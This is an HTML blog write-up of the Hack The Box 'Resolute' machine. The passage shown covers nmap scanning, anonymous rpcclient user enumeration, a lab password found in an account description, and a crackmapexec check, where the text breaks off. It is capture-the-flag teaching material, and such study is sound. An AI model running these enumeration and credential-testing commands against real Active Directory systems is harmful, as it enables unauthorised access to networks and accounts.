@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB: Resolute :: The Logan Lab</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="**HTB | Resolute - Write up**" />
+<meta name="keywords" content=", " />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://theloganlab.github.io/posts/resolute/" />
+
+
+
+
+<link rel="stylesheet" href="https://theloganlab.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://theloganlab.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://theloganlab.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://theloganlab.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB: Resolute">
+<meta property="og:description" content="**HTB | Resolute - Write up**" />
+<meta property="og:url" content="https://theloganlab.github.io/posts/resolute/" />
+<meta property="og:site_name" content="The Logan Lab" />
+
+  <meta property="og:image" content="https://theloganlab.github.io/Resolute.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-13 14:36:46 -0500 -05" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    l0gan334&#39;s lab
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://app.hackthebox.com/profile/overview">HTB profile</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://theloganlab.github.io/posts/resolute/">HTB: Resolute</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-13
+        
+      </span>
+    
+    
+      <span class="post-author">:: l0gan334</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://theloganlab.github.io/tags/rpc/">rpc</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/dnsadmins/">dnsadmins</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/windows/">windows</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/information_leakage/">information_leakage</a>&nbsp;
+    
+    #<a href="https://theloganlab.github.io/tags/windows/">windows</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="https://theloganlab.github.io/Resolute.png"
+    class="post-cover"
+    alt="HTB: Resolute"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Resolute</strong> starts with a Windows RPC enumeration, we are going to get a password in the description of an user. Then we are going to connect over WinRM with <strong>evil-winrm</strong>.</p>
+<p>Next up we are going to find the next user&rsquo;s credentials in a <strong>PowerShell transcript file</strong>. This user is member of group DnsAdmins, which will allow us to get a reverse shell as SYSTEM with a malicious dll file.</p>
+<h1 id="recon"><strong><code>Recon</code></strong><a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h1 id="nmap">Nmap<a href="#nmap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>With nmap we find a lot of opened ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- -sS --min-rate <span style="color:#ae81ff">5000</span> --open -v -n -Pn 10.129.74.219 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked up and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-13 16:00 -05
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 16:00
+</span></span><span style="display:flex;"><span>Scanning 10.129.74.219 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 16:00, 14.72s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.74.219
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65511</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open  domain
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws
+</span></span><span style="display:flex;"><span>47001/tcp open  winrm
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown
+</span></span><span style="display:flex;"><span>49665/tcp open  unknown
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown
+</span></span><span style="display:flex;"><span>49668/tcp open  unknown
+</span></span><span style="display:flex;"><span>49671/tcp open  unknown
+</span></span><span style="display:flex;"><span>49676/tcp open  unknown
+</span></span><span style="display:flex;"><span>49677/tcp open  unknown
+</span></span><span style="display:flex;"><span>49686/tcp open  unknown
+</span></span><span style="display:flex;"><span>49791/tcp open  unknown
+</span></span><span style="display:flex;"><span>49810/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.93 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">72095</span> <span style="color:#f92672">(</span>3.172MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">71717</span> <span style="color:#f92672">(</span>2.869MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>With the parameter <strong>-oG</strong> we are exporting the result in <strong>grepable format</strong>, which is great to manage with <strong>regex</strong> and get all the ports without needing to type them one by one:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox"  />
+    <label for="1">
+      <span class="collapsable-code__language">bash</span>
+      <span class="collapsable-code__title">Here you have an useful function you can use for this manner</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-bash" ><code>
+extractPorts () {
+	ports=&#34;$(cat $1 | grep -oP &#39;\d{1,5}/open&#39; | awk &#39;{print $1}&#39; FS=&#39;/&#39; | xargs | tr &#39; &#39; &#39;,&#39;)&#34;
+	ip_address=&#34;$(cat $1 | grep initiated | awk &#39;NF{print $NF}&#39;)&#34;
+	echo -e &#34;\n[*] Extracting information...\n&#34; &gt; extractPorts.tmp
+	echo -e &#34;\t[*] IP Address: $ip_address&#34; &gt;&gt; extractPorts.tmp
+	echo -e &#34;\t[*] Open ports: $ports\n&#34; &gt;&gt; extractPorts.tmp
+	echo $ports | tr -d &#39;\n&#39; | xclip -sel clip
+	echo -e &#34;[*] Ports copied to clipboard\n&#34; &gt;&gt; extractPorts.tmp
+	/bin/batcat extractPorts.tmp
+	rm extractPorts.tmp
+}
+</code></pre>
+  </div>
+
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ extractPorts allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting information...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> IP Address: 10.129.74.219
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49686,49791,49810
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ports copied to clipboard
+</span></span></code></pre></div><p>With parameters <strong>-sCV</strong> we will discover the service and version running behind each port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49686,49791,49810 10.129.74.219 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-07-13 16:02 -05
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.74.219
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain       Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2022-07-13 21:09:51Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: MEGABANK<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: megabank.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf       .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49671/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49677/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49686/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49791/tcp open  unknown
+</span></span><span style="display:flex;"><span>49810/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>. . .
+</span></span></code></pre></div><p>This amount of ports can be a little overwhelming but let&rsquo;s start with RPC since a lot of ports are about this service.</p>
+<p>With <strong>rpcclient</strong> we can try to list content:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> 10.129.74.219 -N -c enumdomusers
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>Administrator<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>DefaultAccount<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f7<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>ryan<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x451<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>marko<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x457<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>sunita<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19c9<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>abigail<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19ca<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>marcus<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19cb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>sally<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19cc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>fred<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19cd<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>angela<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19ce<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>felicia<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19cf<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>gustavo<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>ulf<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d1<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>stevie<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>claire<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d3<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>paulo<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>steve<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d5<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>annette<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d6<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>annika<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d7<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>per<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>claude<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x19d9<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>melanie<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x2775<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>zach<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x2776<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>simon<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x2777<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>user:<span style="color:#f92672">[</span>naoki<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x2778<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>As we have no credentials with parameter -N we try to login with no password and it works, we get to list the domain users.</p>
+<p>We can list information about any user with <strong>queryuser</strong> and the rdi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient $&gt; queryuser 0x1f4
+</span></span><span style="display:flex;"><span>	User Name   :	Administrator
+</span></span><span style="display:flex;"><span>	Full Name   :
+</span></span><span style="display:flex;"><span>	Home Drive  :
+</span></span><span style="display:flex;"><span>	Dir Drive   :
+</span></span><span style="display:flex;"><span>	Profile Path:
+</span></span><span style="display:flex;"><span>	Logon Script:
+</span></span><span style="display:flex;"><span>	Description :	Built-in account <span style="color:#66d9ef">for</span> administering the computer/domain
+</span></span><span style="display:flex;"><span>	Workstations:
+</span></span><span style="display:flex;"><span>	Comment     :
+</span></span><span style="display:flex;"><span>	Remote Dial :
+</span></span><span style="display:flex;"><span>	Logon Time               :	Wed, <span style="color:#ae81ff">13</span> Jul <span style="color:#ae81ff">2022</span> 16:02:34 -05
+</span></span><span style="display:flex;"><span>	Logoff Time              :	Wed, <span style="color:#ae81ff">31</span> Dec <span style="color:#ae81ff">1969</span> 19:00:00 -05
+</span></span><span style="display:flex;"><span>	Kickoff Time             :	Wed, <span style="color:#ae81ff">31</span> Dec <span style="color:#ae81ff">1969</span> 19:00:00 -05
+</span></span><span style="display:flex;"><span>	Password last set Time   :	Wed, <span style="color:#ae81ff">13</span> Jul <span style="color:#ae81ff">2022</span> 16:15:10 -05
+</span></span><span style="display:flex;"><span>	Password can change Time :	Thu, <span style="color:#ae81ff">14</span> Jul <span style="color:#ae81ff">2022</span> 16:15:10 -05
+</span></span><span style="display:flex;"><span>	Password must change Time:	Wed, <span style="color:#ae81ff">13</span> Sep <span style="color:#ae81ff">30828</span> 21:48:05 -05
+</span></span><span style="display:flex;"><span>	unknown_2<span style="color:#f92672">[</span>0..31<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>	user_rid :	0x1f4
+</span></span><span style="display:flex;"><span>	group_rid:	0x201
+</span></span><span style="display:flex;"><span>	acb_info :	0x00000210
+</span></span><span style="display:flex;"><span>	fields_present:	0x00ffffff
+</span></span><span style="display:flex;"><span>	logon_divs:	<span style="color:#ae81ff">168</span>
+</span></span><span style="display:flex;"><span>	bad_password_count:	0x00000000
+</span></span><span style="display:flex;"><span>	logon_count:	0x00000059
+</span></span><span style="display:flex;"><span>	padding1<span style="color:#f92672">[</span>0..7<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>	logon_hrs<span style="color:#f92672">[</span>0..21<span style="color:#f92672">]</span>...
+</span></span></code></pre></div><p>As you can see the user has a Description, this might have interesting informatoin about the user, we can get every user&rsquo;s Description with <strong>querydispinfo</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rpcclient $&gt; querydispinfo
+</span></span><span style="display:flex;"><span>index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: Built-in account <span style="color:#66d9ef">for</span> administering the computer/domain
+</span></span><span style="display:flex;"><span>index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: A user account managed by the system.
+</span></span><span style="display:flex;"><span>index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain
+</span></span><span style="display:flex;"><span>index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: Key Distribution Center Service Account
+</span></span><span style="display:flex;"><span>index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
+</span></span><span style="display:flex;"><span>index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>	Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>The description set for user <strong>marco</strong> has a password hardcoded: <em>Welcome123!</em>.</p>
+<p>We can check if the is password correct with <strong>crackmapexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ crackmapexec smb 10.129.74.219 -u marco -p Welcome123!
